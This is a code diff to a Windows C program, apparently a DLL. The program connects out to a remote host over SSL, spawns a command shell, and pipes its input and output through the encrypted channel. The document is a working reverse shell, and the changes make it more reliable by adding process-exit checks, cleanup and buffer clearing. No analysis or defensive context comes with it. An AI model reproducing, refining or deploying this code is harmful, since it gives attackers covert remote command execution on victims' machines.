@@ -42,6 +42,7 @@ int main() {
 
 	WSAStartup(MAKEWORD(2, 2), &data);
 	sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
+
 	// Open socket successful
 	if (sock != -1) {
 		sockAddr.sin_family = AF_INET;
@@ -62,25 +63,22 @@ int main() {
 			result = SSL_connect(cSSL);
 
 			//SSL successful
-			if (result != -1)
-			{
+			if (result != -1){
 
 				char recvBuffer[bufferSize];
 				char sendBuffer[bufferSize];
 				SSL_write(cSSL, "Client Connected. Press Enter to spawn shell.\r\n", 48);
 				memset(recvBuffer, 0, sizeof(recvBuffer));
 				result = SSL_read(cSSL, (char *)recvBuffer, sizeof(recvBuffer));
-				if (result <= 0) {
-					closesocket(sock);
-					WSACleanup();
-					exit(1);
-				}
-				else {
+
+				if (result != -1) {
+
 					STARTUPINFO sInfo;
 					SECURITY_ATTRIBUTES secAttrs;
 					PROCESS_INFORMATION procInf;
 					PIPE InWrite, InRead, OutWrite, OutRead;
 					DWORD bytesReadFromPipe;
+					DWORD exitCode;
 					int outputSize;
 
 					secAttrs.nLength = sizeof(SECURITY_ATTRIBUTES);
@@ -99,6 +97,20 @@ int main() {
 					CreateProcess(NULL, process, NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &procInf);
 
 					while (sock != SOCKET_ERROR){
+						
+						// check if shell executable started with CreateProcess still running, if dead terminate.
+						GetExitCodeProcess(procInf.hProcess, &exitCode);
+						if (exitCode != STILL_ACTIVE) {
+
+							SSL_CTX_free(sslctx);
+							closesocket(sock);
+							WSACleanup();
+							memset(&sInfo, 0, sizeof(sInfo));
+							memset(sendBuffer, 0, sizeof(sendBuffer));
+							memset(recvBuffer, 0, sizeof(recvBuffer));
+							exit(0);
+						}
+
 						Sleep(200);
 						memset(sendBuffer, 0, sizeof(sendBuffer));
 						PeekNamedPipe(InWrite, NULL, NULL, NULL, &bytesReadFromPipe, NULL);
@@ -108,6 +120,7 @@ int main() {
 								break;
 							else{
 								SSL_write(cSSL, (char *)sendBuffer, (int) bytesReadFromPipe);
+								memset(sendBuffer, 0, sizeof(sendBuffer));
 								bytesReadFromPipe = 0;
 
 								// Wait. If there is more output, go to top of loop and continue sending. common for long directory listings
@@ -123,27 +136,34 @@ int main() {
 						// Got new input from remote end
 						if (result > 0) {
 							if (strcmp(recvBuffer, exitCmd) == 0) {
+
 								SSL_write(cSSL, "Exiting Shell. Goodbye.\r\n", 26);
+								SSL_CTX_free(sslctx);
+								closesocket(sock);
+								WSACleanup();
+								memset(&sInfo, 0, sizeof(sInfo));
+								memset(sendBuffer, 0, sizeof(sendBuffer));
+								memset(recvBuffer, 0, sizeof(recvBuffer));
 								exit(0);
 							}
 							WriteFile(OutRead, recvBuffer, result, &bytesReadFromPipe, NULL);
+							memset(recvBuffer, 0, sizeof(recvBuffer));
 							result = 0;
 						}
 
 					}
-
-					if (result <= 0) {
-						closesocket(sock);
-						WSACleanup();
-						exit(1);
-					}
 				}
 			}
+
+			SSL_CTX_free(sslctx);
+
 		}
+
+		closesocket(sock);
+		WSACleanup();
 	}
 
 	exit(1);
-	return 0;
 }
 
 BOOL APIENTRY DllMain( HMODULE hModule,
